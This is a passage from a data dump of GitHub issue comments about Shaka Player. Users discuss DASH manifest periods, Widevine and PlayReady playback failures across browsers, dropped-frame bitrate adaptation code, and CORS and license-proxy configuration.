versions.\nMaybe the mapping between adaptationSets or Representations between the periods can be flawed somehow?. OK. I'll look into if the Period@start changes. It should not!  It may be because we create the Period with a SCTE-35 ad marker as early as possible in order to get minimal delay. This means that we create it when we know at what time we close the old period, but we do not yet have a segment in the new Period, which is thus empty. This is something that is not yet allowed in DASH but considered a bug by the editor.. The Manifest.mpd is a bad source with one period which is changing Period@start.\nThe proper URL ends with manifest.mpd (lower m):\n https://moln.edgeware.tv/__cl/cg:ibc/__c/ibc2018/__op/default/__f/manifest.mpd\nThe latter produces periods like\n     <Period start=\"PT1541685905S\" id=\"p_0_385421476\" duration=\"PT40S\">\n     <Period start=\"PT1541685945S\" id=\"p_0_385421486\">\n\nwhile the Manifest.mpd has only the latest period start and with non-changing id=\"p_0_0\" which is obviously wrong: \n     <Period start=\"PT1541685945S\" id=\"p_0_0\">\n\nThe manifest.mpd URL plays nicely in Chrome 70 with Shaka-player v2.5.0-beta.. @ismena I think you can close this. Thanks for your engagement.. I've fixed the corporate CLA now.. OK. Missed that. Will fix. Thanks.. Will fix.. Will fix.. ",
    "dkonovalov": "Thank you for your answer and the code snippet. Yes, the app includes cast API since I just use demo app which I wrap in an Android WebView. I assume that some sort of cast support is embedded in chrome browser and missing in android webview then.. Hi @joewoodhouse. I gave up on the idea and implemented native video player with chromecast etc, and then wrapped it into a cordova plugin. Works much better than wrapping Shaka in cordova, also from performance prospective. . ",
    "joewoodhouse": "@dkonovalov Wondering if you ever resolved this? I'm now looking to implement a Cast Sender app in Cordova/Ionic myself. The plugin ecosystem doesn't seem to have moved on much since your last post!. ",
    "steve-o": "@joeyparrish I copied the manifest and retargeted each BaseURL to a local copy of each resource.\nI presume there maybe something in there off-standard that may break the player, but it does not look too unusual:\nhttps://junko.hk/chome/dash.mpd. Ooh, thank you.  Still looks like a bug in that function though as var info is out of scope.. Working on trying to fix that, there are two lines matching the undefined object:\nhttps://github.com/google/shaka-player/blob/master/lib/dash/dash_parser.js#L659\nhttps://github.com/google/shaka-player/blob/master/lib/dash/dash_parser.js#L665\nThe only scope for 'var info' is in the 'for' loop on line 613, unless I am missing something?  Is there a globally scoped version?. ",
    "duanxianze": "Thank you very much!. ",
    "londonshliach": "Great. \nThank you very much.. The same issue occurs when I try to unload().\nSo there is no way for me to detect when the user loses connectivity and switch to a video which has already been downloaded, as I cannot unload() or destroy() the player.. Thanks.. @vaage \nI guess I'll wait for Garbage Collection to be added to Shaka player.\nThanks for the quick response.. Thanks for the quick response.. ",
    "dakom": "\nDoes this answer your question?\n\nAnd then some! :)\nFeel free to close the ticket... though I do have a few followup questions like how I can spin up a licensing server to test this with, and if I can control the frequency of the CDM messaging. Is there a discussion group around this somewhere?\nThanks!. Sorry I missed this... yeah feel free to close, was a super minor point anyway (how far back do we go... need to install an OS before running the build script too :P)\nThanks!. ",
    "ckelsey": "Hi,\nI'm having a similar issue. I'm using v2.0.1 of the player and am having trouble playing dash videos if Firefox 50 and up. The same video played correctly in Firefox 49. To transcode the videos, I'm using FFmpeg and Shaka-packager. In FFmpeg, if I change the profile from high or main to baseline, then try and play in Firefox, it plays as expected. However, changing the profile setting is not a desirable option.\nTo make sure it's not my code that is causing issues, I've tested on the Shaka Player demo with the following files:\nProfile set to baseline:\nhttps://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-1.mpd\nProfile set to high (errors):\nhttps://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-2.mpd\nThe error it gives is \"The last segment should not end before the end of the Period.\" However, it also says that in Chrome and still plays.\nAnother interesting thing to note, if you click play on the manifest that errors then seek ahead, the video will actually play. It will throw undefined errors, but plays which what makes me suspect it has something to do with the initialization.\nI've also tested using Dash-if's player in Firefox 50 and both files play as expected:\nhttp://mediapm.edgesuite.net/dash/public/nightly/samples/dash-if-reference-player/index.html\nThanks for any insight you may have.. @izar89  and @cpeterso, my apologies, I just updated my comment with the correct links.. @cpeterso\nAm I missing something? I see that it gets initialized as there is a duration, but it does not play on the Shaka demo.\nJust to make sure:\nBrowser: Firefox 50.1.0\nPlayer: http://shaka-player-demo.appspot.com/demo/\nManifest: https://s3-us-west-2.amazonaws.com/cklsymedia/dash/sintel-2.mpd\nThis is what I see(I turned on html5 controls just for visibility)\n\n. @izar89, When I do get info on the files I see Dimensions:1586\u2006\u00d7\u2006676, but ffprobe gives me 1280x676. I think maybe the discrepancy comes from how mac interprets the pixel dimensions.\nI'm interested in why you don't get the same error as I do, but have the same symptoms. My shaka packager command is exactly the same, minus file names.\n@cpeterso Do you know if there's anything actionable with the error messages?. Perfect thanks. ",
    "hyurtseven81": "Hi this is from shaka player demo:\n{\"width\":1024,\"height\":426,\"streamBandwidth\":847976,\"decodedFrames\":2421,\"droppedFrames\":277,\"estimatedBandwidth\":1354235.0455966967,\"playTime\":100.9060001373291,\"bufferingTime\":10.399999856948853,\"switchHistory\":[{\"timestamp\":1482257692.107,\"id\":18,\"type\":\"audio\",\"fromAdaptation\":true},{\"timestamp\":1482257692.107,\"id\":16,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257692.107,\"id\":1,\"type\":\"text\",\"fromAdaptation\":true},{\"timestamp\":1482257714.235,\"id\":12,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257733.92,\"id\":15,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257750.902,\"id\":14,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257762.185,\"id\":15,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257771.055,\"id\":14,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257790.403,\"id\":15,\"type\":\"video\",\"fromAdaptation\":true}]}\nAnd this is from my implementation:\n{\"width\":960,\"height\":540,\"streamBandwidth\":1928000,\"decodedFrames\":989,\"droppedFrames\":598,\"estimatedBandwidth\":2797661.432542304,\"playTime\":74.41499996185303,\"bufferingTime\":4.71399998664856,\"switchHistory\":[{\"timestamp\":1482257883.496,\"id\":1,\"type\":\"audio\",\"fromAdaptation\":true},{\"timestamp\":1482257883.496,\"id\":5,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257892.207,\"id\":8,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257900.254,\"id\":5,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257908.544,\"id\":6,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257932.689,\"id\":7,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257940.81,\"id\":8,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1482257950.422,\"id\":7,\"type\":\"video\",\"fromAdaptation\":true}]}\nThank you for your helps. Thank you for your help, i'm gonna try your resolution solution and i will share the results here.\nThank you again.. By the way is there an optimal drop rate threshold? . Thank you again, i will try to find a solution.. i've fixed the linter and test issues and i've tested as compiled mode, as far as i test i works as expected. i'm still continuing to test, i will try to inform you about updates. Hi all,\nWhen i'm waiting this feature added to core, i implemented a drop frame solution but i need your help and advise about the idea and implementation, i'm sending the code\nto sum, i create a 5 seconds interval, and check the current period drop frame percentage if this period exceeds the threshold i limit the max resolution,\ni tried the cool down period implementation but when i test on a low-end machine i saw the following behaviour:\nPlayer starts playing on high bitrate drop frames start and the following function limits the max height and the bitrate the lower than max bitrate player can play video without any drop frame and cooldown period starts after that drop frames starts again. so my opinion cooldown period can be useless.\n`\nvar DROPPED_PERCENTAGE_FORBID = 0.20;\nvar droppedFramesHistory_ = [];\nvar maxIndex;\nsetInterval(function () {\n  try {\n    var variants = player.getBitrateLevels();\n    if (!maxIndex) {\n      maxIndex = variants.length;\n    }\n    var stats = player.shaka.getStats();\n    var droppedFrames = stats.droppedFrames;\n    var totalFrames = droppedFrames + stats.decodedFrames;\ndroppedFramesHistory_.push({\n  droppedFrames: droppedFrames,\n  totalFrames: totalFrames\n});\n\nfor (var i = 1; i < droppedFramesHistory_.length; i++) { \n  if (droppedFramesHistory_[i]) {\n    droppedFrames = droppedFramesHistory_[i].droppedFrames - droppedFramesHistory_[i - 1].droppedFrames;\n    if (droppedFrames < 0) {\n      droppedFrames = 0;\n    }\n    totalFrames = droppedFramesHistory_[i].totalFrames - droppedFramesHistory_[i - 1].totalFrames;\n    if (totalFrames < 0) {\n      totalFrames = 0;\n    }\n\n    if (\n      droppedFrames / totalFrames > DROPPED_PERCENTAGE_FORBID\n    ) {\n      maxIndex = maxIndex - 1;\n      if (maxIndex <= 1) {\n        maxIndex = 1;\n      }\n      console.log('DroppedFramesRule, index: ' + maxIndex + ' Dropped Frames: ' + droppedFrames + ' Total Frames: ' + totalFrames);\n      player.shaka.setMaxHardwareResolution(variants[maxIndex - 1].width, variants[maxIndex - 1].height);\n      // to clear buffer i set a static bitrate and change that to auto again\n      player.setBitrateLevel(maxIndex);\n      player.setBitrateLevel(-1);\n      droppedFramesHistory_ = [];\n      break;\n    }\n  }\n}\n\n} catch (e) {\n    console.error(e);\n  }\n}, 5000);\n`. @bitactive Thank you for your reply, i'll try to change the line that you suggested and i'm waiting your test results.\n. ",
    "ToreJuloe": "For my part, my question was answered, thank you.\nI don't have any concrete experience implementing a method for observing dropped frames as an ABR signal, but I know that Dash.js has something of the sort implemented:\nhttps://github.com/Dash-Industry-Forum/dash.js/blob/master/src/streaming/rules/abr/DroppedFramesRule.js\nHowever, I've worked with a player based on Dash.js and it operated with a total number of lost frames during the course of the playback, which is not an ideal solution, since frame drops can also be caused by a number of different outside factors, such as resizing the browser window, even on a very fast machine. Therefore it seems to me, that such an algorithm should be able to account for temporary fluctuations in the frequency of frame drops (which should ideally be zero per second), caused by either observable user action (scrolling, resizing etc.) or actions taken outside the context of the browser.\nI apologize for lacking the mathematical vocabulary to perhaps properly explain this, but I think that what I'm thinking of is calculating from a rolling window or moving average, so as not to penalize the entire playback of a movie back to lowest bitrate, because the user switched to full screen in the first couple of minutes.\nPerhaps dropped frame checking could be a little more aggressive around the time when ABR switches to a better quality and larger segments are being decrypted for the first time.. Dash.js seems to be working on this as well. Perhaps there's some insight to be gained from reading their parser: https://github.com/Dash-Industry-Forum/dash.js/blob/development/src/mss/parser/MssParser.js\nrx-player also has one: https://github.com/canalplus/rx-player/blob/master/src/net/smooth/parser.js. ",
    "vitalist82": "Thank you for the suggestion.\nTears of Steel with subtitles is working the same way (without quality switching) as the Widevine encoded asset, but still only in TV browser, not on desktop in Chrome.. I did some further testing today and found out, that on VIZIO Smartcast TV, it is possible to play the stream without any workaround, just by providing a proper config to the player, although I don't understand, how exactly it fixes the issue.\nUnfortunately, the same player configuration doesn't work on the other Netfront-based Toshiba.\nI am setting following properties of the config (we are using the same settings for our Chromecast receiver app):\n```\nvar restrictions:Restrictions = {\n    minBandwidth: 0,\n    maxBandwidth: maxBitrate\n};\nvar config:PlayerConfiguration = {\n    abr: {\n        bandwidthDowngradeTarget: BANDWIDTH_DOWNGRADE_TARGET,\n        bandwidthUpgradeTarget: BANDWIDTH_UPGRADE_TARGET,\n        defaultBandwidthEstimate: startBitrate,\n        restrictions: restrictions\n    },\n    streaming: {\n        retryParameters: {\n            timeout: STREAMING_TIMEOUT,\n            maxAttempts: 3\n        },\n        rebufferingGoal: 1,\n        bufferingGoal: 1,\n        bufferBehind: 1\n    },\n    restrictions: restrictions\n};\n```\nThe workaround from movePlayhead_ function hasn't been called during my tests, so it's probably not causing any issues on VIZIO Smartcast.\nDebugging on Toshiba device is a bit more difficult than on VIZIO Smartcast and I need to get some logs in order to understand what's going on.. We already had some issues with the mentioned Toshiba TV, that we solved partly with your help and partly with help of the manufacturer. VIZIO SmartCast is a new device in our family.. Current issue is related to the 12s fragment size and should be resolved on the side of our stream provider by providing streams with lower fragment size in the future.\nTo sum up my latest test results:\nAfter creating the config change for VIZIO SmartCast I tried removing as many as possible parts of the config to get the smallest set of settings that are necessary to enable playback and it turned out, that 'defaultBandwidthEstimate' is the most important one. I also increased the timeout of the application which is limiting the interval between setting the source and start of the playback. Previously it was set to 10s, which was sometimes too short to download all the 12s long segments in higher quality on a slower network.\nAfter doing these changes and being happy with results, I provided the code to a team based on a different place, connected through a different, even slower VPN (also EU to US) and they observed some issues (playback was working only in few cases from many attempts). Later during the day, probably because the VPN connection got slower, I also started noticing issues with the same configuration, which led me to decreasing the defaultBandwidthEstimate to a lower bitrate, which worked for that moment.\nFrom all the testing so far, it seems, that the main issue is the network connection being too slow for the 12s segments in higher bitrate. As next step, I'll check, whether the -0.1s workaround can improve the experience in some cases and I'll also increase the application's timeouts, so that the player is not limited by the time it needs to download all the segments before starting the playback.\nI will update you if I'll find something new. Many thanks for your support.\n. ",
    "ErvinGegner": "Great, thank you for the reply, looking forward to 2.1.0. @joeyparrish Wonderful I think you've done everything you could on your side so now its my turn to apply configurations as you've recommended.\nThank you for quick response and the overall assistance.. ",
    "johanhil": "@Pierpaolo1992 It looks to me like the mpd is downloaded correctly, but the Lynyrd...mp4 path is not correctly configured in nginx.\nSince your browser is visiting http://172.17.0.1:8080, accessing the mp4 from another ip/port will be a CORS request (https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS - see the section about \"Preflighted requests\").\nSince the preflight OPTIONS for LynyrdSkynyrdFreebirdVideo.mp4 is getting a 405 (HTTP error code fo \"method not allowed\"), I guess this means that you have to configure nginx to allow for OPTIONS requests to this file. \nIt seems like this is some recommended of basic setup for CORS:ing files:\nhttp://enable-cors.org/server_nginx.html (just make sure to change location from / to /LynyrdSkynyrdFreebirdVideo.mp4).. @joeyparrish This has been fixed now, in the 1.23 firmware that was rolled out to Ultra's a few days ago.. This comment explaining waitingToClearBuffer is out of date now, right?\n. ",
    "halibegic": "Ok, thank You.. ",
    "youseframadan933": "Ok, thank You.. ",
    "jpmedley": "http_plugin.js:94 HEAD http://storage.googleapis.com/shaka-demo-assets/angel-one/dash.mp 404 ()\n(anonymous) @ http_plugin.js:94\nshaka.net.HttpPlugin @ http_plugin.js:36\nshaka.net.NetworkingEngine.send_ @ networking_engine.js:357\n(anonymous) @ networking_engine.js:285\nstring_utils.js:130 Unable to find byte-order-mark, making an educated guess.\nhttp_plugin.js:69 HTTP error text: \nhttp_plugin.js:94 HEAD http://storage.googleapis.com/shaka-demo-assets/angel-one/dash.mp 404 ()\n(anonymous) @ http_plugin.js:94\nshaka.net.HttpPlugin @ http_plugin.js:36\nshaka.net.NetworkingEngine.send_ @ networking_engine.js:357\nstring_utils.js:130 Unable to find byte-order-mark, making an educated guess.\nhttp_plugin.js:69 HTTP error text: . I also can't seem to get shaka.log.Level to change the output either.. ",
    "salmoro": "Here I've managed to reproduce this\nSee the programmed player here:\nhttps://dwnmi3sz90i0g.cloudfront.net/\nAnd here is the MPD it's pointing to which plays well (beginning to end) on all Shaka versions tested (including Shaka demo player):\nhttps://s3.amazonaws.com/aws-website-shaka-rewind-a9cdr/dash.mpd\nImportant Note:\nWe've only been able to reproduce this consistently with slower computers (i5 dual core and some quad) and with cache cleared. Not sure if this is a function of CPU or RAM (or GPU or something else)but it is important to point out that on some computers it's not possible to reproduce.\nWe've tried this on multiple versions of Chrome including Canary, Version 58.0.2989.0 and we're getting the same results. We've also seen this consistently on Firefox.\nHere's what the player does: Begins player at 480.033 (seconds), after an initial delay of 1 seconds it repeats 5 times a rewind of 10 seconds with a 0.5 seconds delay in between. Ultimately the player gets to 7:10 (480-5x10) and will not play.\nThe player up above is running on shaka-player.compiled.debug.js (compiled 1/7/2017 from the master branch). So you can monitor console for errors and warnings.\nSpecs of computers that consistently reproduced:\n-Intel i5-4210u 2.40 GHz, 8GB RAM - Windows 7-64\n-Intel i5-4590 3.30 GHz, 8GB RAM - Windows 7-64\n-Intel i3-m370 2.40 GHz, 4GB RAM - Windows 7-64\nSpecs of computer that consistently didn't reproduce:\n-Intel i7-6800k 3.40 GHz, 16GB RAM - Windows 10-64\nPlease let me know if there's anything else you need.\nThanks. Thanks! Will test and confirm.. TheModMaker,\nOn the above linked content, your fix actually worked (here it is with the latest player). Yet we have private content which still seems to maintain resembling issues.\nWould it be possible for us to PM you a link to our content?\nThanks!. @TheModMaker \nThanks! We've been since trying the player with the most recent changes and while it has solved the immediate rewind to a previous period case, we've noticed that if we continue skipping backwards 10 seconds at a time after player stops buffering, it'll ultimately hang, usually once it gets back into an even earlier period.\nAgain, we had trouble reproducing on public content and it'll be easier if we can PM you a link.\nThanks very much.. Is this still included in the milestone of v2.1.0?. Thanks. We're currently testing. With the latest code, so far we cannot seem to reproduce. Will confirm.. Bug seems to have been fixed. TYVM!. Thanks for the fantastic support.. My bad, I don't see the requests in the network tab (which I do see in the working versions).\nThe player and content URLs are all http.. @joeyparrish, just changed to https and all is good. Thanks very much.. @ismena Sorry. I too am having trouble reproducing with the above content (even though I'm pretty sure I was yesterday). On private content I'm able to reproduced consistently. Can I PM you a link to private content?. Okay then my assumption was inaccurate and I will always install polyfills before checking isBrowserSupported(). \nThanks @joeyparrish and @TheModMaker. ",
    "dulmandakh": "Hi @joeyparrish, I sent you an email with manifest and license server URI.\nThank you. Dig into Shaka Player source code and found that DRM detection code is in  lib/media/drm_engine.js file. Then copy pasted code from shaka.media.DrmEngine.probeSupport function line by line into Electron console to see where detection fails.\nIt seems that navigator.requestMediaKeySystemAccess is working just fine, but access.createMediaKeys() is throwing an exception below\n\nDOMException: Unable to create the CDM for the key system com.widevine.alpha.\n\nI'm wondering how would Bitmovin detecting Widevine CDM.. ",
    "mjaddani": "I'have the same error on windows 10 but on chrome it's work fine and firefox it's works, after few secondes, the player freeze, of i force low bitrate it's work but if i enable adaptatif bitrate or i select hight bitrate, it's work few secondes.\ndrm_engine.js:1210 It is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior in the future, potentially including failure to play.\n(anonymous) @ drm_engine.js:1210\nmpd_utils.js:332 The last segment should not end before the end of the Period. shaka.media.SegmentReference\nshaka.dash.MpdUtils.fitSegmentReferences @ mpd_utils.js:332\nmpd_utils.js:332 The last segment should not end before the end of the Period. shaka.media.SegmentReference\nshaka.dash.MpdUtils.fitSegmentReferences @ mpd_utils.js:332\nmpd_utils.js:332 The last segment should not end before the end of the Period. shaka.media.SegmentReference\nshaka.dash.MpdUtils.fitSegmentReferences @ mpd_utils.js:332\nmpd_utils.js:332 The last segment should not end before the end of the Period. shaka.media.SegmentReference\nshaka.dash.MpdUtils.fitSegmentReferences @ mpd_utils.js:332\nmpd_utils.js:332 The last segment should not end before the end of the Period. shaka.media.SegmentReference\nshaka.dash.MpdUtils.fitSegmentReferences @ mpd_utils.js:332\ndrm_engine.js:494 It is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior in the future, potentially including failure to play.\n. Sorry, we don't have disable acces list. It's ok now for you. could you try. Yes the url is of the server url : https://widevine-dev.tv.sfr.net/rest/widevine/testlicence\nIt's a post request because we need a widevine payload\n. Is anyone testing my content please?. Sorry, we couldn't re encode the content because we have more than 30 000 contents and it's not possible. The content works fine on chrome, Set Top box, mobile application Android and iOS also i'have tested it with commercial player on Firefox and it's work fine. It's possible to force jump the gap automatically ? . I'have change this param and now it's work\nshaka.media.TimeRangesUtils.GAP_TOLERANCE = 0.10; // 40 ms\nAlso the same content don't work in Edge and IE11 with PlayReady. We have an error 3016. It's possible to send you a private message with credancial to teste this ?\nThanks\n. Thanks for your response. finally i'have reproduce the same teste with playready\ndash mpd (Playready/Widevine): https://vod-drm-ssl.pfd.sfr.net/out/vod/dash/4/5/e/NEO13283718/NEO13283718.mpd\nMPD Clear content: https://ncdn-vod-ssl.pfd.sfr.net/out/vod/dash/46/99/VOF96278/VOF96278.mpd\nwidevine url: https://widevine-dev.tv.sfr.net/rest/widevine/testlicence\nplayready url: https://playready-dev.tv.sfr.net/PlayReadyTest/rightsmanager.asmx\nWith Shaka Player (MSE/EME), do you know what version of PlayReady Server SDK is compatible ?\nThe content is ok with Chrome / Firefox (see message before) but not on IE11 and Edge, do you have a issue about this please ?\n. Many thanks, i will test it\nIt\u2019s the same think for chromecast because chromecast use shaka ?\nBest regards\nLe ven. 20 juil. 2018 \u00e0 20:29, Joey Parrish notifications@github.com a\n\u00e9crit :\n\nThis is because you have no suggestedPresentationDelay attribute in your\nmanifest, combined with a timeShiftBufferDepth of 10s.\ntimeShiftBufferDepth of 10s means that only 10s of content is accessible\nto the client at a time.\nTo compensate for the time it takes clients to get started, you use the\nsuggestedPresentationDelay attribute in DASH. Your manifest doesn't have\none specified, so we default to 10s. You can change this default through\nconfiguration. For example:\nplayer.configure('manifest.dash.defaultPresentationDelay', 30);\nThe effect of presentation delay is that the live edge of taken backward\nby that amount. So for 10s, the live edge is 10s behind the content\navailable on the server. This means the client can buffer 10s ahead of what\nit can play.\nHowever, since your timeShiftBufferDepth is only 10s, that means that only\n10s of content is available, and playback happens at the left edge of that\nrange. Your timeShiftBufferDepth should be larger than your presentation\ndelay.\nIn the latest code on master, both of these parameters can be tuned\nthrough configuration. (Subject to us fixing the bug we just discovered in\n1177 https://github.com/google/shaka-player/issues/1177.) Here's an\nexample that works well for your stream with Chrome's \"Fast 3G\" network\nemulation:\nplayer.configure({\n  manifest: {\n    availabilityWindowOverride: 20,\n    dash: {\n      defaultPresentationDelay: 10\n    }\n  }\n});\nWith that config and the fix for #1177\nhttps://github.com/google/shaka-player/issues/1177 (out soon), your\ncontent can be played. You could also fix this by tweaking your manifest\nlike so:\n\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1493#issuecomment-406688843,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AT5aXENtE3aNBZypLMbvAzU_LqW0N56jks5uIiGWgaJpZM4VSOGe\n.\n. With this params, the content works . On the same platform, i'have an another content who don't work with your params. I'send you by email the url. Thanks for your help. Yes i think, it's the same. Does exist any workaround ?\n\nBest regards\n2018-07-18 17:36 GMT+02:00 Chris Fillmore notifications@github.com:\n\nIs this the same as #1476\nhttps://github.com/google/shaka-player/issues/1476 ?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1498#issuecomment-405974950,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AT5aXBipz4Y--ij_l971bwNxAT3OBkJZks5uH1XsgaJpZM4VUAOP\n.\n. Yes you can reproduce with my  content.\n\nI keep it for you,\nLe ven. 20 juil. 2018 \u00e0 21:27, Joey Parrish notifications@github.com a\n\u00e9crit :\n\nNot yet. We have not been able to reproduce #1476\nhttps://github.com/google/shaka-player/issues/1476 yet. I will try with\nthe content you emailed us. Perhaps if we can reproduce using your content,\nwe can solve and close both issues.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1498#issuecomment-406703789,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AT5aXKXe2IXXGgqxZ-r8Bqknx1z0SrCmks5uIi8KgaJpZM4VUAOP\n.\n. I'have the same issue with IE11.. For disabling serviceWorker, we will just remove serviceworker.js ?\n\nLe jeu. 26 juil. 2018 \u00e0 21:13, Joey Parrish notifications@github.com a\n\u00e9crit :\n\nI haven't been able to figure this out yet. In the mean time, I recommend\nthat you not use a ServiceWorker in your application. Our demo uses one,\nbut if you aren't using ServiceWorker, you should not run into this bug.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1498#issuecomment-408204689,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AT5aXK5eebG_y1okAZDN9fpxhX2HmQ6jks5uKhTbgaJpZM4VUAOP\n.\n. We have found a solution, it's to use the params  on the manifest. If we don't do a redirect but we rewrite the manifest with a good  params, it's work on every Browser Firefox, Chrome, Edge, IE11.. Now, we rewrite manifest params <Location> on the mpd and it's works for all browser.. I'have tested \"persistentStateRequired: true\", but we have some strange issue, If i try to play 10 lives content we have 4 failures, we have a black screen and no error on the console.\n\nDo we need any think on the licence ?. When the playing failed, i'have all the time this.\n00:00:00 691 | info | DecryptingDemuxerStream: no key for key ID XXXXXX\n00:00:00 691 | info | DecryptingVideoDecoder: no key for key ID XXXXXX\n00:00:00 224 | duration | 4294967296\n00:00:01 734 | info | DecryptingDemuxerStream: key was added, resuming decrypt\n00:00:01 734 | info | DecryptingVideoDecoder: key added, resuming decode\n00:00:01 734 | info | DecryptingDemuxerStream: no key for key ID XXXXXX\n00:00:01 735 | info | DecryptingVideoDecoder: no key for key ID XXXXXX\nI'have the same process on proxy server, the same key, and the duration session it's same all the time.. This case is like #1554 \ndo you have analyse my content ?\nOn Firefox, we have this error\n{\n  \"severity\": 2,\n  \"category\": 3,\n  \"code\": 3016,\n  \"data\": [\n    3,\n    null,\n    \"NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - class mozilla::ipc::IPCResult __cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed\"\n  ],\n  \"handled\": false,\n  \"message\": \"Shaka Error MEDIA.VIDEO_ERROR (3,,NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - class mozilla::ipc::IPCResult __cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed)\",\n  \"stack\": \"shaka.util.Error@**/lib/util/error.js:88:13\\nshaka.Player.prototype.onVideoError_@***/lib/player.js:3114:17\\n\"\n}. No problem, We use a live content with widevine DRM.\nIf i use persistentStateRequired: true on shaka, most of the time the content works, but some times, shaka don't play the content and we have an error with Firefox and no error with Chrome but the content don't play.\nOn chrome,  we have this error onchrome://media-internals/\n00:00:00 691 | info | DecryptingDemuxerStream: no key for key ID XXXXXX\n00:00:00 691 | info | DecryptingVideoDecoder: no key for key ID XXXXXX\n00:00:00 224 | duration | 4294967296\n00:00:01 734 | info | DecryptingDemuxerStream: key was added, resuming decrypt\n00:00:01 734 | info | DecryptingVideoDecoder: key added, resuming decode\n00:00:01 734 | info | DecryptingDemuxerStream: no key for key ID XXXXXX\n00:00:01 735 | info | DecryptingVideoDecoder: no key for key ID XXXXXX\nAnd for Firefox, we have this\n{\n\"severity\": 2,\n\"category\": 3,\n\"code\": 3016,\n\"data\": [\n3,\nnull,\n\"NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - class mozilla::ipc::IPCResult __cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed\"\n],\n\"handled\": false,\n\"message\": \"Shaka Error MEDIA.VIDEO_ERROR (3,,NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - class mozilla::ipc::IPCResult _cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed)\",\n\"stack\": \"shaka.util.Error@******/lib/util/error.js:88:13\\nshaka.Player.prototype.onVideoError@*****/lib/player.js:3114:17\\n\"\n}\nBut if i disable persistentStateRequired: false, we don't have any error. We send the same widevine licence, with the same id.\nI send you email to reproduct that\n. Yes we want to track device Id to do a restriction, we use persistentStateRequired: true, and we use provider_client_token on widevine licence.\nIt's Widevine engeneer who has give me this  advice.\n. On Widevine DRM Proxy documentation, we have this, \nClient token to send back in the license response.  If\nthe license request contains a client token, this value\nis ignored. The client token will persist beyond license\nsessions.\nprovider_client_token is only supported in the Chrome\nCDM and persistentState must be enabled by the Application.\nMy Widevine contact is Prashant Grover. Also I have met Joey Parrish in London as part of Widevine training\n. My need is to be able to have a device id. Thanks @vaage , but for the Android Device, we have solution. My point is for Chrome and Firefox, the advise it's to use persistentStateRequired=trueand Widevine Proxy set the param provider_client_token with a device Id. This advise work but sometimes I have some mistakes that I went back to above\nPlayback fails randomly, about 1 out of 40 times (i.e. if you refresh the page multiple times). When playback fails, the license request returns with a 200 status, but the browser fails to decrypt segments with the newly acquired key.\n. ",
    "andybets": "Thank you.\nI wonder if it could somehow be two segments out then?\nIt's single period, the manifest is here.\nI've noticed issues begin around the 65-70 minutes into the video, and in this case it was due to ffmpeg libx264 being used for encoding without scenecut disabled (or similar), but I can't always control manifest creation, or the version of Chrome being used.\nThe buffering event fires when seeking begins, but I never receive an event to show it's complete, I think because the currentTime isn't within the buffered range. I would expect that if on receiving all requested data, the currentTime isn't within buffered range, this might throw an error event.\nI could well be misunderstanding something here, and any help is appreciated to make the player resilient even with invalid manifests.. Thanks very much for the explanations, and again, your great work on the player!\nI am using the setTimout approach currently, which I think will do for now. Would automatically seeking to buffer start not interfere with reverse playback? I ask because I also use that.. Thanks. Rewinding past the buffered range performs acceptably for our player at the moment (with the obvious pause whilst the previous segment loads).\nI was concerned that the proposed change you mention ('automatically seeking to the buffer start') could break this for us, by jumping from the end to the start of buffer. Is that the case?. ",
    "sgrogov": "Thank you, Joey!. ",
    "tfrivold": "Thank you for the detailed response and bigger picture perspective. I look forward to the changes coming down the pipe in future releases. In the meantime, I will make local changes on a forked version.\nThank you!. ",
    "bson": "Sorry for the delay; haven't had time to investigate in detail.  Indeed, the response is a JSON dict.  I'll investigate and unwrap it - that doc is extremely helpful and I bet this is exactly the problem. facepalm. Thanks for the help - it turns out it was indeed wrapped and adding a response filter to unwrap it made playback work.  CastLabs puts it in a key name 'license', so the response filter is specific to their license proxy.... ",
    "nibaboojit": "widevine license response message :  {\"status\":\"OK\",\"license\":\"{base64String}\", ......}\nyour proxy server have to return decoded license base64String  data.. ",
